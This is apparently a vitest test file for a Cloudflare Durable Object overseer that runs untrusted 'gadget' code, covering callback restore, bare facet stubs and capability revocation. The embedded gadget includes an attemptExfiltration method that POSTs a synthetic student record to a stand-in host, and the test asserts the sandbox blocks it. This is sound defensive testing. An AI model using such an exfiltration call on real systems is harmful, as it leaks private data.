// A gadget can only call its own `ctx.restore()` -- the way it mints persistent callbacks for
// spawned agents and hooks -- if the request reached its facet through a stub the overseer minted
// with *its* `ctx.restore()`; that stub is what tells the runtime how to recreate the facet. So
// every stub the overseer hands out for a gadget facet (getGadgetFacet, behind the client's
// connectToGadget and every binding loopback) must come from there, never from a bare
// `ctx.facets.get()`.
//
// Runs a real gadget, loaded from a real commit, inside a real OverseerDurableObject.

import { describe, expect, it, vi } from "vitest";
import { env } from "cloudflare:workers";
import { runInDurableObject } from "cloudflare:test";
import type { OverseerDurableObject } from "../src/overseer.js";
import type { UserDurableObject } from "../src/user.js";

declare module "cloudflare:workers" {
  interface ProvidedEnv {
    TEST_OVERSEER: DurableObjectNamespace<OverseerDurableObject>;
    TEST_USER: DurableObjectNamespace<UserDurableObject>;
  }
}

const GADGET_ID = 1;

// A gadget whose method mints a persistent callback from inside the gadget itself.
const SERVER_JS = `
import { DurableObject, RpcTarget, restore } from "cloudflare:workers";

export class Gadget extends DurableObject {
  hello() {
    return "hi";
  }

  async attemptExfiltration() {
    try {
      await fetch("https://exfiltration.invalid/student", {
        method: "POST",
        body: "synthetic-student-record",
      });
    } catch (error) {
      return error.message;
    }
    return "outbound fetch unexpectedly succeeded";
  }

  mintCallback(tag) {
    return this.ctx.restore({ type: "callback", tag });
  }

  [restore](params) {
    if (params.type !== "callback") throw new TypeError("unknown restore type");
    return new Callback(params.tag);
  }
}

class Callback extends RpcTarget {
  constructor(tag) {
    super();
    this.tag = tag;
  }
  ping() {
    return "pong:" + this.tag;
  }
}
`;

let doCounter = 0;

async function withGadget(fn: (impl: any) => Promise<void>,
                          stub = env.TEST_OVERSEER.getByName(`gadget-restore-${++doCounter}`))
    : Promise<void> {
  await runInDurableObject(stub, async (instance: OverseerDurableObject) => {
    let impl = (instance as unknown as { impl: any }).impl;
    let commitId = await impl.gitStore.writeFilesAsCommit(new Map([["server.js", SERVER_JS]]), {
      parents: [],
      author: { name: "Alice", email: "alice@example.com" },
      message: "test commit",
      timestamp: new Date(1700000000_000),
    });
    impl.storage.gadgets.put({
      type: "gadget", id: GADGET_ID, title: "G", created: new Date(0), bindingName: "G",
      bindings: {}, commitId,
    });
    await fn(impl);
  });
}

describe("gadget ctx.restore()", () => {
  it("refuses direct public-network fetch from untrusted Gadget JavaScript",
      () => withGadget(async impl => {
    // Exercises loadGadgetWorker's globalOutbound: null in the real workerd sandbox.
    // No connector or capability-policy decision is involved; use synthetic data only.
    using gadget = await impl.getGadgetFacet(GADGET_ID);
    expect(await gadget.attemptExfiltration()).toContain(
        "This worker is not permitted to access the internet");
    expect(await gadget.hello()).toBe("hi");
  }));

  it("works through the stub getGadgetFacet hands out, and the result survives storage",
      () => withGadget(async impl => {
    using gadget = await impl.getGadgetFacet(GADGET_ID);
    using callback = await gadget.mintCallback("a");
    expect(await callback.ping()).toBe("pong:a");

    // The stub is persistent: written to storage and read back, it restores through the
    // overseer's [restore]() to the gadget facet and then through the gadget's own.
    await impl.ctx.storage.put("callback", callback);
    using restored = await impl.ctx.storage.get("callback");
    expect(await restored.ping()).toBe("pong:a");
  }));

  it("is refused through a bare facet stub (what the fix guards against)",
      () => withGadget(async impl => {
    // Start the facet the supported way, then reach the same running facet directly.
    using gadget = await impl.getGadgetFacet(GADGET_ID);
    using callback = await gadget.mintCallback("a");
    expect(await callback.ping()).toBe("pong:a");

    let bare = impl.ctx.facets.get(impl.gadgetFacetName(GADGET_ID), () => {
      throw new Error("facet should already be running");
    });
    expect(await bare.hello()).toBe("hi");
    // The gadget's ctx.restore() throws "cannot be used in this context because the system does
    // not know how to restore this context itself" (visible in the gadget's own log); the message
    // that reaches the caller is currently garbled by the runtime, so only the rejection is
    // asserted.
    await expect(bare.mintCallback("b")).rejects.toThrow();
  }));
});


describe("live-capability revocation (SCHO-309)", () => {
  // Formerly SCHO-292's surviving-escape repro: a descendant callback outlived the root's
  // restriction. Revocation now restarts the workspace, which ends descendants with their root.
  it("gates a retained root and loaders on admission, and revoking ends its descendants too",
      async () => {
    let stub = env.TEST_OVERSEER.getByName(`gadget-restore-${++doCounter}`);
    let name = `principal:prn_restore-${doCounter}`;
    let user = env.TEST_USER.getByName(name);
    await user.authenticateFromCfAccess(name, true, "Teacher", name);
    let userId = env.TEST_USER.idFromName(name).toString();
    let allowed = true;
    let policy = { authorizeCapability: async () => allowed
      ? { outcome: "allow" } : { outcome: "deny", message: "Synthetic revocation." } };
    // Durable Objects in this isolate share one env object.
    let setPolicy = (value: unknown) => runInDurableObject(
        env.TEST_USER.getByName("policy-installer"),
        instance => { Reflect.set(Reflect.get(instance, "env"), "WORKSHOP_CAPABILITY_POLICY", value); });
    await setPolicy(policy);
    try {
      await withGadget(async impl => {
        // Nobody admitted: nothing executes, whatever the policy would allow.
        expect(() => impl.loadGadgetWorker(GADGET_ID)).toThrow("needs an admitted principal");
        await expect(impl.getGadgetFacet(GADGET_ID)).rejects.toThrow("needs an admitted principal");
        await expect(impl.executeCodeMode(1, "throw new Error('must not run')", {}, "model", {}))
          .rejects.toThrow("needs an admitted principal");
        expect(() => impl.startGatekeeperSession({ type: "gadget", id: GADGET_ID }, { from: "user" }))
          .toThrow("needs an admitted principal");
        await expect(impl.applyPendingAction({ type: "action", gatekeeperId: 999 }, {}, false))
          .rejects.toThrow("needs an admitted principal");
        await impl.admitPrincipal(userId, "gadget.execute");
      }, stub);

      // Minted while allowed, and held outside the workspace as a client holds them.
      using gadget = await stub.testGadgetFacet(GADGET_ID);
      using callback = await gadget.mintCallback("allowed");
      expect(await gadget.hello()).toBe("hi");
      expect(await callback.ping()).toBe("pong:allowed");

      allowed = false;
      await runInDurableObject(stub, (instance: OverseerDurableObject) =>
          (instance as unknown as { impl: any }).impl.recheckStanding());
      // The restart disposes the descendant along with its root.
      await vi.waitFor(async () => expect(await failed(callback.ping())).toBe(true),
          { timeout: 5_000, interval: 50 });
      expect(await failed(gadget.hello())).toBe(true);
    } finally {
      await setPolicy(undefined);
    }
  });
});

// Use one rejection handler: .rejects forks native JsRpcPromise continuations.
async function failed(call: Promise<unknown>): Promise<boolean> {
  try {
    await call;
    return false;
  } catch {
    return true;
  }
}
